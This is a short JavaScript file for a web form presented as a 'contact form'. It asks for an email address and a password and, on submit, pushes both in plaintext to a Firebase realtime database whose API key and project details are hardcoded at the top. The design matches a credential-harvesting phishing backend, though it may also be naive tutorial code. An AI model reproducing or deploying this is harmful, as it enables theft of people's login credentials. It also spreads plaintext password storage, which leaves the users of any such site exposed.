// contactform app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBswbsx_vlUUmes3DQqDWHTcMbbFTd0YZE",
    authDomain: "realcontactform.firebaseapp.com",
    databaseURL: "https://realcontactform-default-rtdb.firebaseio.com",
    projectId: "realcontactform",
    storageBucket: "realcontactform.appspot.com",
    messagingSenderId: "70317048762",
    appId: "1:70317048762:web:96b3c159fc9636f6ed1383"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

//reference your database
var realcontactformDB = firebase.database().ref('realcontactform')

document.getElementById('realcontactform').addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var email = getElementVal("email");
    var password = getElementVal("password");

    saveContactInfo(email, password);

    //enable alert text
    document.querySelector('.alert').style.display = "block"

    //remove alert message

    setTimeout(() => {
        document.querySelector('.alert').style.display = "none"
    }, 3000);

    //reset form
    document.getElementById('realcontactform').reset();

}

//get contact info and save to firebase
const saveContactInfo = (email, password) => {
    const newContactForm = realcontactformDB.push()

    newContactForm.set({
        email: email,
        password: password,
    });
}

const getElementVal = (id) => {
    return document.getElementById(id).value;
}

function handleShowPassword() {
    var x = document.getElementById("password");
    if (x.type === "password") {
      x.type = "text";
    } else {
      x.type = "password";
    }
  }